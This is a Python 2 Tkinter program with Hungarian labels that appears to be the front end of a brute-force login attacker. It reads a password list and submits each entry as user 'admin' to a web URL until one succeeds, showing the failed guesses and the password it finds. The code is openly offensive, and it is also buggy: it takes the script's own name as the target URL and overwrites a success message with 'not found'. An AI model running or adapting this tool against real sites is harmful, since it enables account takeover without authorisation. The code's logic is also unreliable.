# -*- coding: utf-8 -*-

import src.brute_force as bf
import sys
import Tkinter as tk
import ScrolledText

global url
global bf
global editArea
global label2
global gui_bf

url = sys.argv[0]

print sys.argv[0]
def gui_bf(url):
    try:
        wrong_page = bf.test_wrong(url)
        if wrong_page[0] == 1:
            print wrong_page[1]
        else:
            f = open("../src/text-files/passwords.txt").read().split("\n")
            for pwd in f:
                if bf.brute_force(url, "admin", pwd, wrong_page) == False:
                    editArea.insert('1.0', "Helytelen: " + pwd + "\n")
                    root.update()
                else:
                    editArea.insert('1.0', "Megvan a jelszó: " + pwd + "\n")
                    label2.configure(text="Megvan a helyes jelszó: " + pwd)
                    root.update()
                    break
            label2.configure(fg="red")
            label2.configure(text="Jelszó nem található!")
    except:
        label2.configure(fg="red")
        label2.configure(text="Hiba történt!")

global label
global label2
  
root = tk.Tk()

root.title("Brute Force")
root.geometry('750x550+100+50')
app = tk.Frame(root)
app.grid()

label = tk.Label(app, text="A megadott URL: " + url, font=("Helvetica", 16))
label.grid()

button = tk.Button(app, text="Brute Force indítása", command=lambda: gui_bf(url))
button.grid()

editArea = ScrolledText.ScrolledText(
    master=app,
    wrap=tk.WORD,
    width=50,
    height=10
)
editArea.grid()

label2 = tk.Label(app, text="", font=("Helvetica", 12), fg="green")
label2.grid()

root.mainloop()








